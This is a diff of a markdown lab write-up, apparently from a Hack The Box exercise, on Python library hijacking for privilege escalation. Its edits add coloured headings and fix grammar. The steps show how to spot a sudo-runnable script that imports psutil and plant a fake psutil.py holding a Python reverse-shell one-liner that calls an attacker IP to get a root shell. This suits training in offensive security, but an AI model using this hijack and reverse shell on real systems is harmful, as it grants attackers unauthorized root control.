@@ -1,4 +1,4 @@
-### What is Python Library Hijacking?
+### <span style="color:#50FA7B">What is Python Library Hijacking?</span>
 
 When a Python script imports a library (like `psutil` or `pandas`), Python looks for the library in specific folders. If we can:
 - Edit the original library file
@@ -8,7 +8,7 @@ When a Python script imports a library (like `psutil` or `pandas`), Python looks
 Then we can **inject our own malicious code** and run it with **elevated privileges**.
 
 ---
-### 🔍 Real-Life Scenario Summary
+### <span style="color:#50FA7B">🔍 Real-Life Scenario Summary</span>
 
 We are given:
 - A Python script `mem_status.py`
@@ -17,11 +17,11 @@ We are given:
 
 Let’s hijack the `psutil` module and run code as root!
 
-## 1. Hijacking via **Writable Library File**
+## <span style="color:#8BE9FD">1. Hijacking via **Writable Library File**</span>
 
-### 🔎 Step-by-Step
+### <span style="color:#50FA7B">🔎 Step-by-Step</span>
 
-#### 1.(a) Check script permissions
+#### <span style="color:#FFB86C">1.(a) Check script permissions</span>
 ```bash
 ls -l mem_status.py
 
@@ -31,7 +31,7 @@ ls -l mem_status.py
 SUID is set → Runs as root  
 ✅ We can read and execute it
 
-#### 1. (b) Sudo Permission: 
+#### <span style="color:#FFB86C">1. (b) Sudo Permission:</span>
 also check if we can excute the same python script with sudo permission:
 ```bash
 sudo -l
@@ -39,23 +39,23 @@ sudo -l
 # output
 (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
 ```
-its mean we can run this script with root permission without any password
+This means we can run this script with root permissions without any password.
 
-#### 2. Check which library is imported
+#### <span style="color:#FFB86C">2. Check which library is imported</span>
 ```bash
 # mem_status.py
 import psutil
 available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
 ```
-in this case we can hijack the psutil library 
-#### 3. Hijacking `psutil` library 
-Now we will create a file in same folder with name `psutil` with python reverse shell code like and start the net-cat listener on attacker machine
+In this case we can hijack the psutil library.
+#### <span style="color:#FFB86C">3. Hijacking `psutil` library</span>
+Now we create a file named `psutil` in the same folder containing Python reverse-shell code, and start a Netcat listener on the attacker machine:
 ```bash
-echo 'import os,pty,socket;s=socket.socket();s.connect(("10.10.15.40",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' > psutil.py
+echo 'import os,pty,socket;s=socket.socket();s.connect(("$ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' > psutil.py
 ```
 
-#### 4. Run the python script with sudo permission
+#### <span style="color:#FFB86C">4. Run the python script with sudo permission</span>
 ```bash
 sudo /usr/bin/python3 /home/htb-student/mem_status.py
 ```
-now you will have the reverse shell
+Now you will have the reverse shell.
